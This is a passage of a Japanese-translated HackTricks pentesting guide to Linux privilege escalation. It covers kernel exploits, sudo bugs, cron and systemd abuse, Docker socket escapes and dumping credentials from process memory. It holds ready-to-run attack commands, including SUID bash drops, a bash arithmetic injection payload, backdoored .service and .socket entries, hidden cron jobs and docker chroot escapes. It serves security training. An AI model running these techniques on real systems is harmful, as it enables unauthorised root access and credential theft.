# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS情報

稼働中のOSについての情報収集を始めましょう
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

もし **`PATH`変数内の任意のフォルダに書き込み権限がある** 場合、いくつかのライブラリやバイナリをハイジャックできる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel バージョンを確認し、権限昇格に利用できる exploit があるか確認する
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱なカーネルの一覧と、既に**compiled exploits**がいくつか見つかる場所: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) および [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
その他、**compiled exploits**を見つけられるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトから脆弱なカーネルのバージョンをすべて抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits を検索するのに役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（victim 上で実行すること、kernel 2.x 向けの exploits のみをチェックします）

常に **Googleでカーネルバージョンを検索** してください。あなたのカーネルバージョンが既知の kernel exploit に記載されている場合があり、その場合はその exploit が有効であることを確認できます。

追加の kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

以下に示されている脆弱な sudo バージョンに基づいて:
```bash
searchsploit sudo
```
この grep を使って sudo のバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo バージョンが 1.9.17p1 より前（**1.9.14 - 1.9.17 < 1.9.17p1**）のものでは、ユーザーが制御するディレクトリから `/etc/nsswitch.conf` が使用される場合、sudo の `--chroot` オプションを介して権限のないローカルユーザーが root に権限昇格できてしまいます。

[PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) はその [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) を悪用するものです。exploit を実行する前に、`sudo` のバージョンが脆弱であり、`chroot` 機能をサポートしていることを確認してください。

詳細は元の [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) を参照してください。

#### sudo < v1.8.28

出典: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

このvulnがどのように悪用されうるかの**例**については、**smasher2 box of HTB** を確認してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御策を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container の内部にいる場合、そこから脱出を試みることができます：

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

何が**マウントされているか、アンマウントされているか**、どこにあり、なぜかを確認してください。もし何かがアンマウントされている場合は、それをマウントして機密情報を確認してみてください
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**任意の compiler がインストールされているか**確認してください。これは、kernel exploit を使用する必要がある場合に有用です。使用するマシン（または類似のマシン）でコンパイルすることが推奨されています。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### インストールされている脆弱なソフトウェア

**インストール済みのパッケージやサービスのバージョン**を確認してください。例えば古い Nagios バージョンがあり、それが escalating privileges に悪用される可能性があります…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンにSSHでアクセスできる場合、**openVAS** を使ってマシン内にインストールされている古く脆弱なソフトウェアをチェックすることもできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示し、その多くはほとんど役に立たないことが多い点に注意してください。したがって、OpenVAS のような、インストール済みソフトウェアのバージョンが既知のエクスプロイトに対して脆弱かどうかをチェックするアプリケーションを使用することを推奨します_

## プロセス

どの**プロセスが**実行されているかを確認し、いずれかのプロセスが本来よりも**多くの権限を持っているか**をチェックしてください（例えば tomcat が root によって実行されているなど）。
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

サーバのいくつかのサービスは **credentials in clear text inside the memory** を保存します。\
通常、他のユーザに属するプロセスのメモリを読むには **root privileges** が必要なため、これは通常既に root のときに追加の資格情報を発見するのに役立ちます。\
ただし、**as a regular user you can read the memory of the processes you own** ことを忘れないでください。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: UID が同じであれば全てのプロセスをデバッグできます。これは従来の ptracing の動作方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグ可能です。
> - **kernel.yama.ptrace_scope = 2**: 管理者のみが ptrace を使用できます（CAP_SYS_PTRACE 権限が必要です）。
> - **kernel.yama.ptrace_scope = 3**: ptrace による追跡はできません。一旦設定すると、ptrace を再び有効にするには再起動が必要です。

#### GDB

例えば FTP サービスのメモリにアクセスできる場合、Heap を取得してその中の credentials を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDに対して、**maps がそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているかを示します**。また、**各マッピング領域の権限**も表示します。**mem** 擬似ファイルは**プロセスのメモリ自体を公開します**。**maps** ファイルから、どの**メモリ領域が読み取り可能か**とそのオフセットが分かります。この情報を使って、**mem ファイルをシークして読み取り可能な領域をすべてダンプする**ことでファイルに保存します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの **物理** メモリへのアクセスを提供し、仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループにのみ読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump は、Windows 用の Sysinternals スイートにあるクラシックな ProcDump ツールを Linux 向けに再構想したものです。入手: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、以下を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でroot要件を削除し、自分が所有するプロセスをダンプできます
- Script A.5 は [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) から入手できます（root が必要です）

### プロセスのメモリからの認証情報

#### 手動の例

authenticator プロセスが実行されているのを見つけたら:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
processをdumpし（前のセクションを参照して、dump the memory of a process のさまざまな方法を確認してください）memory内のcredentialsを検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の資格情報を盗み**、**いくつかのよく知られたファイルから**も取得します。正しく動作させるには root 権限が必要です。

| 機能                                              | プロセス名             |
| ------------------------------------------------- | ---------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password           |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon   |
| LightDM (Ubuntu Desktop)                          | lightdm                |
| VSFTPd (Active FTP Connections)                   | vsftpd                 |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2                |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                  |

#### 検索正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron ジョブ

### Crontab UI (alseambusher) が root として動作している – web-based scheduler privesc

もし web “Crontab UI” パネル (alseambusher/crontab-ui) が root として動作し、loopback にのみバインドされている場合でも、SSH local port-forwarding を使って到達し、権限昇格のための特権ジョブを作成できます。

Typical chain
- loopback のみのポート（例: 127.0.0.1:8000）と Basic-Auth realm を `ss -ntlp` / `curl -v localhost:8000` で発見
- 運用アーティファクトから認証情報を見つける:
- バックアップ／スクリプト内の `zip -P <password>`
- systemd ユニットで `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` が露出している
- トンネルしてログイン：
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成してすぐに実行する (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```
ハードニング
- Crontab UIをrootで実行しない。専用ユーザーと最小権限で制限すること
- localhostにバインドし、さらにfirewall/VPNでアクセスを制限する。パスワードを使い回さないこと
- unit filesに秘密を埋め込まない。secret storesやroot-only EnvironmentFileを使用すること
- on-demand job executionsに対してaudit/loggingを有効にすること



スケジュールされたジョブが脆弱か確認する。rootによって実行されるscriptを悪用できるかもしれない（wildcard vuln? rootが使用するファイルを変更できるか? use symlinks? rootが使用するディレクトリに特定のファイルを作成できるか?）
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例えば、_/etc/crontab_ の中には PATH を次のように見つけることができます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（ユーザ "user" が /home/user に書き込み権限を持っている点に注意）

もしこの crontab 内で root ユーザがパスを設定せずにコマンドやスクリプトを実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\  
その場合、次のようにして root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron がワイルドカードを含むスクリプトを使用する (Wildcard Injection)

もしスクリプトが root によって実行され、コマンド内に「**\***」が含まれている場合、これを悪用して予期しないこと（例えば privesc）を引き起こす可能性があります。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードが次のようなパスの前にある場合** _**/some/path/\***_ **、脆弱ではありません（_**./\***_ **も同様）。**

次のページを参照してください（wildcard exploitation tricks の詳細）:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash は ((...)), $((...)) および let の算術評価より前に parameter expansion と command substitution を実行します。もし root の cron/parser が untrusted な log fields を読み取り、それらを arithmetic context に渡すと、攻撃者は command substitution $(...) を注入でき、cron 実行時に root としてそれが実行されます。

- なぜ動くか: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値は最初に substitution され（コマンドが実行され）、残った数値 `0` が算術に使用されるためスクリプトはエラーなく続行します。

- 典型的な脆弱パターン:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: パースされるログに attacker-controlled なテキストを書き込み、数値のように見えるフィールドが command substitution を含み末尾が数字になるようにします。算術が有効なままになるよう、コマンドは stdout に出力しない（またはリダイレクトする）ことを確認してください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

もし root によって実行される **cron script を変更できる** なら、非常に簡単に shell を取得できます：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootによって実行されるscriptが、**あなたが完全にアクセスできるdirectory**を使用している場合、そのfolderを削除し、あなたが制御するscriptを配信する別のfolderへの**symlink folderを作成する**ことが有用かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 書き込み可能なペイロードを持つカスタム署名付きcronバイナリ
Blue teams は、cronで実行されるバイナリをカスタム ELF セクションをダンプし、vendor 文字列を grep で検索してから root として実行することで「署名」することがある。もしそのバイナリがグループ書き込み可能（例: `/opt/AV/periodic-checks/monitor` 所有者 `root:devs 770`）で、署名の材料を leak できるなら、そのセクションを偽造して cron タスクを乗っ取ることができる。

1. `pspy` を使って検証フローをキャプチャする。Era の例では、root は `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してからファイルを実行していた。
2. leaked key/config (from `signing.zip`) を使って期待される証明書を再作成する:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 悪意ある置き換えを作成（例: SUID bash を置く、あなたの SSH キーを追加）し、証明書を `.text_sig` に埋め込んで grep が通るようにする:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 実行ビットを維持したままスケジュールされたバイナリを上書きする:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 次の cron 実行を待つ。単純な署名チェックが成功すると、あなたのペイロードが root として実行される。

### 頻繁に実行される cron ジョブ
プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探すことができる。うまく利用すれば権限昇格に使えるかもしれない。

例えば、**1分間に0.1秒ごとに監視する**、**実行回数の少ないコマンドでソートする**、そして最も多く実行されたコマンドを削除するには、次のようにする:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは開始するすべてのプロセスを監視して一覧表示します)。

### 見えない cron jobs

コメントの後に**キャリッジリターンを入れる**（改行文字なしで）ことで cronjob を作成でき、cron job は動作します。例（キャリッジリターン文字に注意）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込みできるか確認してください。書き込み可能なら、それを**変更して**サービスが**開始**、**再起動**、または**停止**したときにあなたの**backdoor**を**実行**させることができます（マシンの再起動を待つ必要があるかもしれません）。\  
例えば `.service` ファイル内にあなたの backdoor を作り、**`ExecStart=/tmp/script.sh`** のように設定します。

### 書き込み可能なサービスのバイナリ

サービスによって実行されるバイナリに対して**書き込み権限がある場合**、それらを書き換えて backdoor を仕込み、サービスが再実行されたときに backdoor が実行されるようにできます。

### systemd PATH - 相対パス

次のコマンドで **systemd** が使用する PATH を確認できます:
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**write**できることが分かった場合、**escalate privileges**できる可能性があります。サービス設定ファイルで**相対パスが使用されている**かどうかを検索する必要があります。例えば:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH folder 内に、**executable** を **same name as the relative path binary** として作成してください。サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されると、あなたの **backdoor will be executed**（unprivileged users は通常サービスを start/stop できませんが、`sudo -l` が使えるか確認してください）。

**サービスについては `man systemd.service` を参照してください。**

## **Timers**

**Timers** は名前が `**.timer**` で終わる systemd unit ファイルで、`**.service**` ファイルやイベントを制御します。**Timers** はカレンダー時間イベントおよびモノトニック時間イベントを組み込みでサポートしており、非同期で実行できるため、cron の代替として使えます。

すべてのタイマーを列挙するには、次のコマンドを実行します:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できる場合、それを使って systemd.unit の既存のユニット（例えば `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> このタイマーが満了したときに起動される unit。引数は、接尾辞が ".timer" でない unit 名です。指定しない場合、この値はタイマーユニットと同じ名前（接尾辞を除く）を持つ service にデフォルトされます。（上記を参照。）起動される unit 名とタイマーユニットの unit 名は、接尾辞を除いて同一にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **書き込み可能なバイナリを実行している**
- Find some systemd unit that is **相対パスを実行している** and you have **書き込み権限** over the **systemd PATH**（その実行ファイルを偽装するため）

**タイマーについては `man systemd.timer` を参照してください。**

### **タイマーの有効化**

タイマーを有効化するには root 権限が必要で、以下を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## ソケット

Unix Domain Sockets (UDS) は、クライアント・サーバモデル内で同一または異なるマシン間の**プロセス間通信**を可能にします。これらはインターコンピュータ通信のための標準的な Unix ディスクリプタファイルを利用し、`.socket` ファイルを介して設定されます。

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** このファイル内では、いくつかの興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは種類が異なりますが、要約すると **どこでソケットをlistenするかを示す**ために使われます（AF_UNIX ソケットファイルのパス、IPv4/6 および/またはリッスンするポート番号など）。
- `Accept`: ブール引数を取ります。**true** の場合、**到着する接続ごとにサービスインスタンスが生成され**、接続ソケットのみが渡されます。**false** の場合、リッスンソケット自体が起動された service unit に渡され、すべての接続に対して単一の service unit が生成されます。この値はデータグラムソケットや FIFO では無視され、これらでは単一の service unit が無条件に全トラフィックを処理します。**Defaults to false**。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法で記述することが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1 行以上のコマンドラインを取り、リッスンする **sockets**/FIFOs がそれぞれ作成され bind される**前**または**後**に**実行されます**。コマンドラインの最初のトークンは絶対ファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする **sockets**/FIFOs がそれぞれ閉じられ削除される**前**または**後**に**実行される**追加の**コマンド**です。
- `Service`: 受信トラフィックに対して**アクティブ化する** service unit 名を指定します。この設定は Accept=no のソケットでのみ許可されます。デフォルトはソケットと同名の service（接尾辞が置き換えられたもの）です。ほとんどの場合、このオプションを使う必要はありません。

### Writable .socket files

もし書き込み可能な `.socket` ファイルを見つけたら、`[Socket]` セクションの先頭に例えば `ExecStartPre=/home/kali/sys/backdoor` のような行を**追加**でき、バックドアはソケットが作成される前に実行されます。したがって、**おそらくマシンの再起動を待つ必要がある**でしょう。\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

もし書き込み可能な socket（ここでは設定ファイルの `.socket` ではなく Unix Sockets のこと）を**特定**できれば、そのソケットと**通信**でき、脆弱性を悪用できる可能性があります。

### Unix ソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意: **sockets listening for HTTP** requests が存在する場合があります（_ここで言っているのは .socket files ではなく、unix sockets として動作するファイルのことです_）。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
もし socket **responds with an HTTP** request なら、それと **communicate** でき、場合によっては **exploit some vulnerability** することができます。

### 書き込み可能な Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

Docker socket への書き込み権限がある場合、次のコマンドで privilege escalation が可能です:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドは、ホストのファイルシステムに対して root 権限でアクセスできる container を実行することを可能にします。

#### **Docker API を直接使用する**

Docker CLI が利用できない場合でも、Docker socket は Docker API と `curl` コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能な images の一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストのルートディレクトリをマウントする container を作成するリクエストを送ります。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使って container への接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

socat 接続を設定した後、ホストのファイルシステムに対して root 権限で container 内から直接コマンドを実行できます。

### その他

docker socket に対して書き込み権限がある場合（**inside the group `docker`** にいるため）、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)があります。もし [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) 場合もあります。

docker から脱出したり、権限を昇格するために悪用する他の方法は次を参照してください:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

`ctr` コマンドを使用できる場合は、次のページを参照してください — **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

`runc` コマンドを使用できる場合は、次のページを参照してください — **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度な inter-Process Communication (IPC) system で、アプリケーションが効率的に相互作用しデータを共有できるようにします。現代の Linux システム向けに設計されており、多様なアプリケーション間通信のための堅牢なフレームワークを提供します。

このシステムは柔軟で、プロセス間のデータ交換を強化する基本的な IPC をサポートし、enhanced UNIX domain sockets を彷彿とさせます。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetooth デーモンからの着信コールに関するシグナルが音楽プレーヤーをミュートさせ、ユーザー体験を向上させる、といった具合です。加えて、D-Bus は remote object system をサポートしており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。

D-Bus は **allow/deny model** に基づいて動作し、マッチするポリシー規則の累積的な効果に基づいてメッセージの権限（メソッド呼び出し、シグナルの送出など）を管理します。これらのポリシーは bus とのやり取りを指定しており、これらの権限を悪用することで privilege escalation を許す場合があります。

そのようなポリシーの例が /etc/dbus-1/system.d/wpa_supplicant.conf にあり、root ユーザーが `fi.w1.wpa_supplicant1` を所有し、送信および受信できる権限が詳細に記述されています。

ユーザーやグループが指定されていないポリシーは普遍的に適用され、一方で「default」コンテキストのポリシーは他の特定のポリシーでカバーされないすべてに適用されます。
```xml
<policy user="root">
